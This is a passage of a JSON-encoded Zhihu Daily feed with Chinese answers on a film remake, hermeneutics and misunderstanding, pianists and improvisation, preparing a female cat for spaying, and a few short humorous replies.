alt=\"\"></figure><p>青春片的品类里，表现当代男生友情的电影已日渐稀少，回忆这个品类，最透彻的竟然还是上世纪打打杀杀中喊义气的古惑仔。</p>\n<p>男生们在不打架的情况下如何表现友情？好友生病后他们怎么表现关心？这种细腻的问题值得探讨。</p>\n<p>但《小小的愿望》只是复刻原版，在演员并不纯熟的演技下，把十七八岁的粗线条小伙子演的像傻子。</p>\n<p>父母在得知本该有大好人生的孩子忽然患上绝症，会有什么反应？能做多少努力？</p>\n<p>《小小的愿望》明明早早抓住了问题，但只翻译韩版，隔靴搔痒，等到《送你一朵小红花》探讨了这个问题时，才发现亲情题材在电影里，也是一片红海。</p>\n<p>还有更深刻的，当一个正值青春的少年失去行动能力，他该如何接受死亡？</p>\n<p>B 站有年轻 up 主记录下自己患癌离世前的身心变化，医院病房里每天都有年轻的生命面临凋零。</p>\n<p><strong>《小小的愿望》不是没有挖掘的点，它只是困在「翻拍」的框架里，仿佛带着镣铐跳舞，只敢墨守成规，不敢打破轨迹。</strong></p>\n<p><strong>但其实，成功的翻拍，都是在创新基础上成立的。</strong></p>\n<p>王家卫重构《东邪西毒》，电影和金庸的小说相去甚远，说是另类武侠，其实是借黄药师们的口，表达现代都市的情感游离。</p>\n<p>电影拍到半中央，经费不够耗，墨镜王只好拉着好搭档刘伟强先搞一出《东成西就》赚钱救救急，电影不讲武侠情谊，讲世俗梦想，结婚的结婚，称王的称王，对侠义的戏说，很符合拍片的动机。</p>\n<p><strong>《射雕英雄传》本是武侠，王家卫让它文艺，刘伟强用它做喜剧，故事都脱胎于射雕，但表达的，是导演所处的时代和经历的故事。</strong></p>\n<p>这是改编和翻拍的意义。</p>\n<p>如今的电影市场，买 IP、买版权，创作灵活度与当初不可同日而语，但创作者要明确的是，翻拍，始终是在别人的宇宙里，讲自己的世界观。</p>\n<p>如果一味被原版牵着鼻子走，一味对标，那么，翻拍不如翻译。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/319232516\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737880"},{"title":"为什么会出现理解偏差？","date":"2021-07-08 23:06:25","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>请走在我的身边，做我的朋友。</span>\n<a href=\"https://www.zhihu.com/question/334226293/answer/1982076556\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这部分是回答“交流为何会出现误解”。</p>\n<p>内容相对抽象。</p>\n<p>如果我会可能带入现有情景的诸多可能，比如互联网或日常沟通等通俗内容，以便于大家进行内化。</p>\n<p>理解与误解并存于诠释活动中，当一个人看到 or 听到另一个人的言论 or 文本，或者一个人从另一个的视角得出某个人的看法，都属于诠释活动的一部分，而“理解”或“误解”既是过程，也是结果。</p>\n<p>当一个理解究竟是“正确”还是“错误”，决定这一切的尺度可以是客观的，也可以是主观的，可以依托于群体，也可以依托于个体。</p>\n<p>这个最终敲定锤子的“法官”所具有的东西就称为【解释权】——我暂且如此定义。</p>\n<p>关于“解释权”的严肃性研究，涉及的范围比较分散，它可以是权利的一种，更可以是权力的一种......比如法律法规来说，在违法犯罪行为的判定上，所依据的解释权就是法条。</p>\n<p>再以知乎的规范来说，用户的著作权属于用户自身，当你感觉到自己写的内容被人“理解错误”，那么对方就是“误解”。</p>\n<p>这是解释权的判定问题。</p>\n<p>这个部分比较重要，有一种叫做“批评权”或者“介入授权”的东西，推荐阅读：</p>\n<p><a href=\"https://www.zhihu.com/answer/1434894604\">知乎用户：为什么人们不喜欢被批评？</a></p>\n<p><a href=\"https://www.zhihu.com/answer/710298376\">知乎用户：该如何对待习惯性论断（judge）他人的人？</a></p>\n<p>这个“解释权”也是类似的，在沟通的过程中必然出现各方以个人视角对文本进行而此解读。</p>\n<p>假设 A 与 B 比较熟络的情况下，沟通并不会仅限于文本内容，A 还会对 B 进行某种“形象构建”，这个涉及某种话语背后的立场和动机揣摩。</p>\n<p>比如在“键盘政治”领域，人们通常习惯于在政治话题中，先摆明立场，而因为立场而团结起来的群体，之后的价值观也会偏向于此立场。</p>\n<p>这部分需要足够的政治素养，不然非常容易变成集体集中于各自立场的争论与狂欢。</p>\n<p>有时候一个人未必没有懂得文本的意思，比较文本内容就摆在那里，如果沟通无障碍的话，必然会出现一些其它“因素”导致了“误解”，但其实在诠释学角度上，这种误解反而会被认为是另外一种“解释”的视角。</p>\n<blockquote>the branch of knowledge that deals with interpretation,especially of the Bible or literary texts.</blockquote>\n<p>诠释学 / 解释学（Hermenuetics）是西方语言哲学的一脉，但最开始的时，它是一种宗教学的内容，源出《圣经》注释学，因此它最初的理论形态所指向的是作者的原意或上帝的思想。</p>\n<p>现如今，诠释学多取广义内涵，主要指对于文本之意义的理解和解释的理论或哲学。</p>\n<p>在不同研究诠释学的领域或学派，对“理解”与“误解”有不同的看法，但其本质上来说是属于概念史的工作，而依据诠释学所得到的方法论——根据现代诠释学的形态不同，有各自的立场与理解。</p>\n<p>举个例子，当张三在网络发表了一篇文章，李四阅到并且有自己的看法。</p>\n<blockquote>在此设立张三的原初文本为 X，张三的主要诠释意义为 A，李四诠释到的内容为 B，同时又为此附着一层意义 B'。</blockquote>\n<p>诠释学的第一种立场是：</p>\n<p><strong>——强调作者的原意。</strong></p>\n<p>在这样的立场下，B'要必然以 A 为主，即李四对张三文本 X 的理解必须要以张三的理解为主。</p>\n<p>若张三对李四的 B'判定为“没读懂”，那么李四就是没有读懂，而这个“判定误读”的权力即是【解释权】。</p>\n<p>基于此立场的诠释学，主要目的是通过语言运用以及理解的足够精炼，铺以对作者的基础理解以及作者在创作时的心理状态，在原初文本造成的多义解释章，寻找最符合作者原意的解释。</p>\n<p>套用到上面的例子，李四想要读懂张三的内容，不仅要对张三的原初文本 X 有基础理解，还要理解张三这个人的世界观、人生观以及价值观，甚至还要揣摩张三在写这篇文本时的心理状态……才能在最优情况下去理解张三的意思。</p>\n<p>有时候李四还不仅是李四，假设张三是某个历史名人，早就已经不在了，现在有两个解读其文本的人——“李四”与“王五”，到底是谁的理解更贴近张三？</p>\n<p>谁有具有判定“解释权”的内容呢？</p>\n<p>这就涉及诠释学的第二种立场：</p>\n<p><strong>——强调文本的意义。</strong></p>\n<p>第二立场是第一种立场的衍生物，是属于诠释学的转向。</p>\n<p>在我个人理解上来看，其主要性质属于从单一的权威中将“解释权”解脱或解放中出来。</p>\n<p>此立场具体主张：文本独立于作者，文本的意义具有其客观性，它只存在于文本自身的语言结构中，但这种理解的基础已经包含理解文本原义的要求。</p>\n<p>理解文本是通达作者的一种途径，但诠释学所研究的文本都是“逝者”的文本，正因为作者原义可望而不可即。</p>\n<p>各方的诠释活动或行为会变成“解释权”性质的权力争夺战，只要有大多数人认为“解释内容”是如此，那么这个“解释”就会成为文本的具体内容——最终又会变成权力的站派。</p>\n<p>第二种立场，强调文本独立于作者且具有自身的意义，无论在题目之间存在什么差异，在本质上都是相同的， 也就是相信先于理解的客观意义。</p>\n<p>在此立场上，人们需要用正确且适用的方法，才能达成正确的理解。</p>\n<p>根据前面所举的例子，同一个文本 X（张三已经仙逝），无论是李四，还是王五的理解，只要在基础理解的文本上面无误，两人的出来的属于之间的“理解”都是正确的，就没有“误解”一说。</p>\n<p>同时，假设张三作为作者在“解释权”上普遍授权，或者在某种部分斟酌李四的理解，不一定要李四以自己的视角作为主要评判尺度，那么最终也就存在“沟通差异”的性质问题，而非“误解”的结论判定。</p>\n<p><strong>这种态度，俗称“包容性”或“开放性”。</strong></p>\n<p>当“解释权”从权威之内解放后，甚至从作者之内超脱后，完全脱离作者的形象，为了更好彰显人的主体性，诠释学也走到更高的形态即【本体论诠释学】，其所强调的是：</p>\n<p><strong>——“读者所领悟的意义”。</strong><strong>「本体论诠释学」</strong></p>\n<p>本体论意义的诠释学通常与存在论相联系，主要代表是海德格尔（Heidegger）与加达默尔（Gadamer），他们将人对文本得到的“诠释意义”，当做人在理解活动中生成并且被构造起来的“东西”。</p>\n<p><strong>它是理解主体在特定的情景中与文本以及一切理解对象照面所产生的结果。</strong></p>\n<p>这个立场才是我需要重点强调的。</p>\n<p>当我们作为一个人发表自己的文本，读到的另外一个人，确实是在对我们所写的文本进行交流，同时也是在对我们进行理解，但无论是什么理解的工具最终还是受归于那“另一个人”对于世界的理解视角。</p>\n<p>科学哲学上有个理论，叫“观察渗透理论”。</p>\n<blockquote>我们的任何观察都不是纯粹客观的，具有不同知识背景的观察者观察同一事物，会得出不同的观察结果。<br>在科学观察面前，人类往往更要借助主体的能动性而不是事物的自然属性来获得经验知识，不同的主体甚至同一主体在不同条件下观察到的结论也不尽相同。</blockquote>\n<p>它重点表征了“先行信息”在人的视角转换中的意义；哲学层面考察的则是主体的“先行具有”、“先行掌握”和“先行视见”等精神的本质力量对于现实的认识活动的条件性。</p>\n<p><strong>观察依赖于理论，观察渗透着理论。</strong><strong>理论决定了观察的目的和对象。</strong></p>\n<p>——这就是所有沟通、交流甚至是解释为何会出现“误解”的根本原因。</p>\n<p>当你在读一本书，你是在读一个世界。</p>\n<p>当你在讲述某个事件，你是在说一个世界。</p>\n<p>关于“你”的视角这个影响因素始终是不能避免的，除非你不听、不看以及不思。</p>\n<p>因此，最优的选择无意义“解放”【诠释权 or 解释权】，无论是你对自己的理解，还是他人对你文本或语言的理解，甚至是你对他人文本或语言的理解，都是“理解”的一种。</p>\n<p>只是有些理解你不接受，或者认为不适用于你，但不代表这种“理解”完全错误，甚至是剥夺那个人自身的存在意义。</p>\n<p>本体论意义的“解释学”，并不讨论如何正确理解文本，它所指向的不是如何认识的问题，更多在于认识与解释这个活动究竟对人产生怎样的影响。</p>\n<p>它并不在意作者或文本的真实意思究竟是什么，而是更多是人与理解内容在相遇后，真实地在人的意识中所发生的事情——<strong>这个“东西”包含周围世界、生活世界与共同世界的一切，即存在者与世界构成的“存在场”。</strong></p>\n<p>本体论诠释学将“理解”作为人对世界的意义生成，表明的是理解主体的生存状态。</p>\n<p>比如李四读张三的话或者文本，真正重要的不是张三究竟这么想，而是李四理解到了什么，为什么理解，怎样进行二次诠释的。</p>\n<p>人在理解文本时，总是包含着赞同或同一，而一个人所赞同的“东西”，不过是构成周围世界理解的东西，是人活在这个世界的真实存在，是人本身的存在方式。</p>\n<p>假如一个人是马克思主义者，或信仰某个宗教，以此主义作为自己的生活方式与思维方式，他所赞同的“主义”就是构建他世界观的一部分，正如孩子赞同父母、老师，也是选择吸纳他们的人生道理作为自己的人生态度。</p>\n<p>由于理解所指向的不再是“作者意图”，或者是“文本内容”，而是主体即读者本身，理解也没有完善与不完善、正确与不正确一说。</p>\n<p>任何人都只是再以不同的方式理解，所表明的是不同的存在方式，各自背后站着不同的世界。</p>\n<p><strong>我的理解是如此，你的理解是如此，我们也有普遍的共识，但我们都是再以不同的方式理解——这种态度就足够了。</strong></p>\n<p>所谓的“误解”不过是针对作者原意而言。</p>\n<p>如果不考虑作者“原意”或文本“原义”，将【解释权】从单一的权威判定中解放出来 ,也就根本谈不上“正解”或“误解”。</p>\n<p>这样的态度是有益的。</p>\n<p>因为误解永远是不可避免且无法清除的。</p>\n<p>同时“误解”也可以是积极因素，它可以带来一种创造性，艺术品对于现实的理解未必不是虚构。</p>\n<p>这种主观的虚构的性质上也包含误解、扭曲，知其所以而有意曲解，但依旧具有创造、开放以及包容的意义。</p>\n<p>仅仅是因为一个人对你有误解，而从根本上否定一个人的存在，当某个解释权不归属于你之下的时候，你也会忌惮自己的发言是否符合权威所想？</p>\n<p>这样的思想是否是自由的？</p>\n<p>每个人都有自己的看法与选择。</p>\n<p>那么，最后需要解决的问题是：</p>\n<p><strong>——是否存在降低误解和沟通不畅的可能？</strong></p>\n<p>对于这个问题，伽达默尔认为“理解”首先意指相互“认同”或“赞同”，所表达的其实不是“理解”本身之意 ，而是一种立场 ，或者确切地说，是理解的前提:</p>\n<blockquote>承认与我对话的言说者之存在的合法性 ，及其言说的合理性 ，言说者应以探索的方式展开对话 ，而不是独白式地宣告真理。</blockquote>\n<p>只有在这个前提下 ，理解或者说相互理解才有可能。</p>\n<p>最终还是变成一个粗浅的结论：</p>\n<p><strong>认同（承认对方）先于理解（认识）。</strong></p>\n<p>以上。</p>\n<hr>\n<p>文献引用与推荐阅读：</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//wap.cnki.net/touch/web/Journal/Article/TJSK200801007.html\" target=\"_blank\" rel=\"nofollow noreferrer\">诠释学:理解与误解 - 天津社会科学 2008 年 01 期 - 手机知网</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/334226293\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737888"},{"title":"为什么只弹钢琴不作曲的人会成大师？","date":"2021-07-08 23:06:18","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-edabbdfed6f5ae034fd2caa2f0376ebc_l.jpg?source=8673f162\"><span>周雨思Yusi，</span><span>知名音乐博主；音乐审美通识教育践行者</span>\n<a href=\"https://www.zhihu.com/question/278773043/answer/1983894708\" hidden>阅读原文</a>\n</div>\n<div>\n<p>钢琴家如果能在原曲的基础上，自我发挥，加入自己的二次创作，那么不可否认，这样的演奏就是非常有价值的。近代很多优秀的钢琴家是当之无愧的大师。但现实情况是如今确实存在一个很大的问题是：大部分的琴童甚至很多钢琴家，只会依照谱子演奏，根本没有自我发挥的能力。<br><br><strong>一、为什么演奏越来越照本宣科，失去了生命力？</strong><br><br>音乐行业的细分，以及大众对古典音乐的固化认知，导致业内人对自身要求降低，逐渐失去了创造力。<br><br>要知道，“钢琴家”是近代才逐渐分化出来的一个职业。在历史上，没有作曲家、演奏家之分，他们只有一个统一的称呼——音乐家。</p>\n<p>既能创作，也能演奏，是那个时代每一名音乐家的基本素养。我们熟知的肖邦、舒曼无一不是能写能弹的全才，即便是当时以演奏出名的克拉拉，也是同样具备创作才能的。</p>\n<p>而当年的音乐家在演奏时，其实常有即兴发挥的时刻。比如，在古典乐协奏曲中，就有专门供演奏者即兴表达的华彩部分。巴赫的《勃兰登堡协奏曲》第五首的第一乐章，就有一段很长的大键琴华彩，我们可以从音乐中听到他自由酣畅的表达。</p>\n<p>但是现在，我们听音乐会，会发现几乎没有任何一场协奏曲的华彩部分是即兴的，因为如今很多“钢琴家”几乎没有这样的能力了。</p>\n<p>是的，近代以来，音乐行业细分出“钢琴家”这一职业，而这个职业，不管是业内人还是大众看来，都是对创作没有要求的。</p>\n<p>但对于一个做音乐的人来说，只会演奏而不能创作，其实是一件很荒谬的事。</p>\n<p>就像一个学英语的人，只学会了背诵和朗读而无法进行日常自主对话，却被认定为“英语专家”。</p>\n<p>很多琴童就是这样被教育和成长起来的，像学“哑巴英语”一样也学成了“哑巴音乐”：只要能依据谱子弹下来就是学会了，根本没有人关心他们是否可以用音乐“说话”。</p>\n<p>可悲的是，出于对古典音乐的固化认知，大众并不认为这是一件很奇怪的事。</p>\n<p>更多的人默认钢琴家只要把曲子弹奏好就可以了，默认他们不需要会创作，默认这些缺乏生命力的音乐是正常的、甚至优秀的。</p>\n<p>我曾经看过一个笑话：如何让一个钢琴家停止弹琴？答案是：把他的谱子拿掉。</p>\n<p>虽然只是一个笑话，但如今想想，真的是意味深长。<br><br><br><strong>二、刻意尝试比起刻意练习，要伟大得多</strong><br><br><br>当然，并非所有钢琴家都在对自己降低标准。依然有很多优秀的钢琴家，在追求创作、追求自我表达，因为他们知道，这才是音乐真正的意义。</p>\n<p>比如我们之前提到的古尔达，他原本在古典乐演奏上已经达到了很高成就，但为了可以有更大的空间自我表达，他选择跨界到爵士乐。这其中的难度可想而知，但古尔达还是义无反顾地去尝试了。</p>\n<p>小时候，我曾看过一本阿格里奇的传记，里面写到古尔达曾经鼓励她去做有更多即兴的爵士乐，但是她拒绝了。<br><br>因为这件事，我一度很不理解阿格里奇，觉得她缺乏勇气去尝试。直到长大后，我才释然，因为她也在自己想做的范畴内去努力了。她尽可能把每一次现场都做到不一样，永远给大家带来惊喜。</p>\n<p>今年60岁的加拿大音乐家哈默林Marc-André Hamelin，也是集创作与演奏才能于一身的大神级人物，古典音乐弹奏信手拈来，创作音乐也不在话下。他创作的小调练习曲，有很多伟大作曲家音乐的身影。</p>\n<p>​另外，俄罗斯90后钢琴家特里福诺夫，也曾创作过钢琴协奏曲。虽然作品中明显有前人的味道，但至少他向前迈出了那一步，有尝试去发出自己的声音。</p>\n<p>所以你问我，自我表达有没有对错？<strong>表达没有对错，但是一定有好坏。</strong></p>\n<p>像上面的例子，这些钢琴家都在有意识地、不断地训练，让自己的演奏方式更丰富，不断让大家听到新的东西，我认为这就是好的表达。</p>\n<p>而那些经验化、套路化，总是用同一种方式来突出情感的，我认为就是不够好的表达。</p>\n<p>郎朗本身其实是一个非常有天赋的表达者，但是我们有时候会感受到他的演奏陷入一种套路化的表达：比如表达浪漫，往往总是先抑后扬，用长音来表达深情。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b6eb31c8221f584270d963b9bce9eb5a_720w.jpg?source=8673f162\" alt=\"\" width=\"936\"></figure><p>不是说这样不对，只是每一次都用这些技巧，就很难再带给人新鲜感，我们会觉得他没有再做过新的思考与尝试了。这一点会让我觉得特别可惜。</p>\n<p>当然，这种无意识的、无思考的表达，并不仅仅存在于古典音乐，哪怕是非常依赖于即兴的爵士，也很容易被这种套路化、经验化的演奏充斥着。因为不加思考地表达，往往是最轻松、最省力的。</p>\n<p>所以在我看来，有意识、有思考的去尝试，比不加思考、千篇一律的重复训练要伟大得多。<br>因为在无数次的尝试中，充满了不为人知的艰辛和挑战，但呈现出的结果，却是最热烈、最动人的花朵。</p>\n<p>音乐，永远不是会弹钢琴就够了，更能打动人的，往往是那些努力尝试后，新鲜而惊艳的瞬间。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/278773043\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737894"},{"title":"给母猫做绝育，需要准备哪些东西？","date":"2021-07-08 23:06:11","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-0f8979457564a883f09bf40a9b2a36fd_l.jpg?source=8673f162\"><span>时雨，</span><span>知乎常驻铲屎官 | iOS开发工程师 | 设计师 | 剑网3</span>\n<a href=\"https://www.zhihu.com/question/470685639/answer/1985818694\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>前言</strong></p>\n<p>我养过公猫和母猫，也经历过各自的绝育过程。</p>\n<p>对比下来发现，母猫的绝育确实要比公猫麻烦很多。</p>\n<p>那么这篇回答就来盘点一下母猫绝育需要提前做的准备以及注意事项吧。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-90332dfa153c3aff002694321b603e99_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>术前准备篇</strong><strong>1.考察准备给猫咪做手术的医院。</strong></p>\n<p>毕竟现在科技发达了，信息查询也越来越快捷。</p>\n<p>一家医院的好坏，也很容易通过一些方法判别。</p>\n<p>比如上一些点评类 APP 查看，或者问一下同样是铲屎官的朋友。</p>\n<p>一家靠谱的医院往往会让猫咪的绝育过程事半功倍。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-772f9ff75e0b1a56e0f06406f2964461_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>2.确保猫咪疫苗完备。</strong></p>\n<p>猫咪绝育是动刀子的事情，而动刀期间，猫咪的抵抗力是很薄弱的。</p>\n<p>如果没有打疫苗，那么很容易在绝育期间染上猫瘟等传染病。</p>\n<p>如果猫咪，尤其是母猫，在绝育期间染上猫瘟，那就会危及生命。</p>\n<p>千万不要抱有侥幸心理。</p>\n<p>有条件的，打完三针疫苗，建议做一个抗体检测，看看猫咪是否产生抗体。</p>\n<p>毕竟不是所有猫咪打完三针疫苗都一定会产生抗体的。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ef6875a5171fa9eca40e587fcbcb434e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>宠物疫苗本（图源网络）</figcaption></figure><p><strong>3.断食断水</strong></p>\n<p>这个最好是咨询做绝育的医院。</p>\n<p>我们家小豆子做绝育的时候，医生让断食断水 12 小时。</p>\n<p>这么做是为了防止猫咪在麻醉期间产生意外。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-42b1eb4d70c7ca80c05e4e9060b4bc01_720w.jpg?source=8673f162\" alt=\"\"><figcaption>猫手术时候是这个画风，如果不断食断水一段时间，确实很容易呛死自己</figcaption></figure><p><strong>4.铲屎官的时间</strong></p>\n<p>因为母猫的绝育手术需要开腹。</p>\n<p>所以术后恢复期需要连续注射几天止疼消炎针。</p>\n<p>这个要咨询给猫咪做绝育手术的兽医。</p>\n<p>提前请假预留出带猫咪打针的时间也是很重要的。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-feb0841759e2640ec32110149ab7cb18_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>5.术前检查</strong></p>\n<p>这个检查一般情况下是检查猫咪有没有病，有没有炎症。</p>\n<p>如果猫咪正在生病，是不适合手术的。</p>\n<p>同时还会检查猫咪的各个器官的代谢能力。如果这些有问题，那么麻醉的风险会加大。</p>\n<p>另外，有一小部分猫咪凝血性很差，是不能做开腹手术的。</p>\n<p>如果您财力雄厚我建议您做一下。以防万一。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-62ab7cf3be62db0b9a97d83b1ce26a55_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>绝育用品篇</strong><strong>1.伊丽莎白圈</strong></p>\n<p>猫咪手术后会本能很想舔伤口，但是他们带刺的小舌头会把伤口舔开导致污染和感染。</p>\n<p>所以准备一个伊丽莎白圈则显得很必要。</p>\n<p>为什么说要提前准备呢？</p>\n<p>因为很多医院卖的都是这种硬的伊丽莎白圈。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-892bf7fadbbb7ff69eba060ef6d83437_720w.jpg?source=8673f162\" alt=\"\"></figure><p>而实际上这种圈猫咪一直戴着并不是很舒服。</p>\n<p>提前在网上买一个软圈，会让猫咪舒服很多。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-324eff1ce8af9cc591674f0645031c5b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>戴软圈的小豆子</figcaption></figure><p><strong><strong>2.猫包或航空箱</strong></strong></p>\n<p>需要选择一款空间足够猫咪平躺在里面，底部材质较硬的猫包才可以。</p>\n<p>横款的要好于竖款的，封闭的要好于透明的。</p>\n<p>猫咪术后真的很痛很难受，一定要给它准备一个好的环境让他在路上舒舒服服的。</p>\n<p>不然猫咪在路上应激，或者不舒服，对术后恢复都会有很大的影响。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-69239df841445be4f602936148a1c76a_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>3.宠物<strong>尿垫</strong></strong></p>\n<p>猫咪刚做完手术的时候，因为麻醉还没完全醒，有可能会不自主排尿。</p>\n<p>可以铺在猫包里，尽量避免这种情况。</p>\n<p>毕竟，绝育完好多天都不能洗澡，如果猫咪脏了的话，还是很遭罪的。</p>\n<p>当然，如果是小公猫，也建议用尿垫替换猫砂几天，毕竟公猫的手术位置在排泄的时候距离猫砂太近了，如果猫砂粉尘很大，有一定概率感染。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c7d16d4a0cf146f2185b758809aaa41b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>4.小毛毯 / 电热毯</strong></strong></p>\n<p>猫咪因为麻醉和开腹手术，会有略微失血的情况。</p>\n<p>导致猫咪的体温下降。</p>\n<p>一般猫咪在醒来后会冷的发抖。</p>\n<p>所以准备一个小毛毯，或者低功率电热毯，会让猫咪暖和很多。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d45aaebef4455bff7818053110edee62_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>5.手术服</strong></strong></p>\n<p>母猫的手术服是很重要的术前准备品。</p>\n<p>虽然医院会给一件“手术服”，但是医院给的手术服是那种菠萝网状的。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4fd125cc9097b45335a65624a68dbf91_720w.jpg?source=8673f162\" alt=\"\"><figcaption>这种医院送的手术服很不舒服，你看给图里的蓝胖子勒的，肯定很难受！</figcaption></figure><p>这种手术服并不会让猫咪很舒服，甚至会把猫咪的腿部勒破。</p>\n<p>如果想让猫咪舒服一些，最好还是自备两个手术服。</p>\n<p>为什么是两个呢，因为方便换洗呀！</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-0fd0c82a1c51249fbd1eda1358755332_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>6.猫笼或者可以限制猫咪活动的房间</strong></strong></p>\n<p>母猫绝育后应该减少活动。</p>\n<p>尤其是那种运动健将型的小母猫。</p>\n<p>我家小豆子就是这样，绝育回家第一件事居然是爬到了猫爬架上。</p>\n<p>吓得我赶紧把之前隔离猫藓用的笼子架起来把它关进去了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f6321123ed617f3330eb2114e9c9f216_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>7.猫咪爱吃的零食</strong></p>\n<p>绝育最初两天，在消炎药和止疼药的作用下，猫咪的食欲必然会下降。</p>\n<p>所以准备点猫咪爱吃的罐头啊猫条啊营养膏啊，是非常有必要的。</p>\n<p>可以在猫咪食欲差的情况下给猫咪快速补充营养。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cf3d09ad04909eb25359c745c85cfef0_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>注意事项篇</strong><strong>1.一定要看住猫咪，千万别让它自己脱了手术服。</strong></p>\n<p>我家小豆子在恢复的时候就超级不老实。</p>\n<p>有一天趁我睡觉的时候，人家居然自己把手术服给脱了。</p>\n<p>还开开心心的在舔它的伤口。</p>\n<p>后来就因为它舔了，这伤口迟迟长不好，耽误了很多事。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-6a987f202d77e9c571354e60868ef44f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>正在重新缝合伤口的小豆子</figcaption></figure><p><strong>2.如果使用多层的猫笼，要对笼子适当限高。</strong></p>\n<p>我家笼子是四层的。</p>\n<p>我家这位运动健将当初会踩着笼子边上的“格子”一步一步往上爬。</p>\n<p>这种一上一下的爬行，很容易把伤口弄开，也是很危险的。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a86262b455cf525ff8c6118d9c7e41a9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>做了限高的笼子</figcaption></figure><p><strong>3.伊丽莎白圈和手术服要合身</strong></p>\n<p>如果小了，猫咪会不舒服。</p>\n<p>如果大了，猫咪就很容易挣脱。</p>\n<p>所以请务必测量好准确的尺寸，报给卖家。</p>\n<p>让卖家给你发货最合适的产品。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-cad7834493af7052f24ca4364d2d3a9a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>猫咪头围以及尺码对比（图源网络，仅用于举例）</figcaption></figure><p><strong>结语</strong></p>\n<p>绝育对于大部分宠物医院来说都是一个小到不能再小的手术。</p>\n<p>对于绝育手术，既不要过分的妖魔化它，把它当成很可怕会要猫咪命的那种手术。</p>\n<p>也不要过分轻视它，导致猫咪恢复不好。</p>\n<p>祝各位的猫咪都能有一个顺利的绝育过程！</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f8ccec49b55c4836c8317086ef6c90e4_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/470685639\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737898"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-07-08 23:06:03","description":"\n<div>\n<h2>古代为什么立嫡长子不立贤？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-d6528ade4d74a8b5c550da631c6e7146_l.jpg?source=8673f162\"><span>雪姑娘，</span><span>语气不好，但三观极正</span>\n<a href=\"https://www.zhihu.com/question/23830200/answer/403527653\" hidden>阅读原文</a>\n</div>\n<div>\n<p>1 2 3 4 5 6 7 8 9</p>\n<p>请找出上面最大的一个数？很简单是 9～</p>\n<p>请找出上面最特别的一个数？选几都有理由</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/23830200\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>学医的女生有多可怕？？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-f4c126b466082aa422259d7bba402f03_l.jpg?source=8673f162\"><span>三川，</span><span>我为米开朗基罗打铁</span>\n<a href=\"https://www.zhihu.com/question/265637604/answer/720112380\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我妈。野战部队医院，骨科小辣椒，肿瘤科一枝花。</p>\n<p>我爸经常把自己喝成傻逼，然后怕我妈骂他，闭目躺床上装死。</p>\n<p>吵架这种东西，得吵出来对吧，如果对方辩友装死猪，你说气不气嘛！</p>\n<p>我妈风情万种地趴在他耳边：你知道吗？我这一刀下去，让你走得没有痛苦。</p>\n<p>我爸：醒了醒了醒了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/265637604\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>90后的你现在拥有多少存款？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-10a68e95fbe911ac38b837ab4a410da2_l.jpg?source=8673f162\"><span>良鹿</span>\n<a href=\"https://www.zhihu.com/question/294492829/answer/660088166\" hidden>阅读原文</a>\n</div>\n<div>\n<p>96，毕业一年了 本来预计存款是五万，现在还差六万。</p>\n</div>\n</div>\n<div><a 